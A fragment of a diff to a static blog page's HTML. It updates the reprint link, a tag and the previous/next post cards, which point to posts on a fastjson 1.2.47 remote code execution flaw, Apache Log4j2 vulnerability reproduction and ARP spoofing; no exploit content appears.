+                    <a href="http://southerose.gitee.io/2021/10/11/fastjson-1.2.47-yuan-cheng-ming-ling-zhi-xing-lou-dong/">http://southerose.gitee.io/2021/10/11/fastjson-1.2.47-yuan-cheng-ming-ling-zhi-xing-lou-dong/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -988,8 +602,8 @@ cat the-flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span>
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E9%9D%B6%E6%9C%BA/">
-                                    <span class="chip bg-color">靶机</span>
+                                <a href="/tags/fastjson/">
+                                    <span class="chip bg-color">fastjson</span>
                                 </a>
                             
                         </div>
@@ -1163,12 +777,12 @@ cat the-flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span>
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/04/21/redis-de-jian-dan-li-yong/">
+                <a href="/2021/11/21/apache-log4j2-lou-dong-fu-xian/">
                     <div class="card-image">
                         
-                        <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20220220100058.png" class="responsive-img" alt="redis的简单利用">
+                        <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20220315195053.png" class="responsive-img" alt="Apache Log4j2漏洞复现">
                         
-                        <span class="card-title">redis的简单利用</span>
+                        <span class="card-title">Apache Log4j2漏洞复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1179,7 +793,7 @@ cat the-flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span>
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-04-21
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-11-21
                         </span>
                         <span class="publish-author">
                             
@@ -1196,8 +810,8 @@ cat the-flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span>
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/redis/">
-                        <span class="chip bg-color">redis</span>
+                    <a href="/tags/log4j2/">
+                        <span class="chip bg-color">log4j2</span>
                     </a>
                     
                 </div>
@@ -1211,12 +825,12 @@ cat the-flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span>
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/04/11/git/">
+                <a href="/2021/10/11/arp-qi-pian/">
                     <div class="card-image">
                         
-                        <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411182120.png" class="responsive-img" alt="git+bash教程">
+                        <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20220220100110.png" class="responsive-img" alt="arp欺骗">
                         
-                        <span class="card-title">git+bash教程</span>
+                        <span class="card-title">arp欺骗</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1227,7 +841,7 @@ cat the-flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span>
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-11
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-11
                             </span>
                         <span class="publish-author">
                             
@@ -1244,12 +858,8 @@ cat the-flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span>
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/git/">
-                        <span class="chip bg-color">git</span>
-                    </a>
-                    
-                    <a href="/tags/%E5%B7%A5%E5%85%B7/">
-                        <span class="chip bg-color">工具</span>
+                    <a href="/tags/arp%E6%AC%BA%E9%AA%97/">
+                        <span class="chip bg-color">arp欺骗</span>
                     </a>
                     
                 </div>
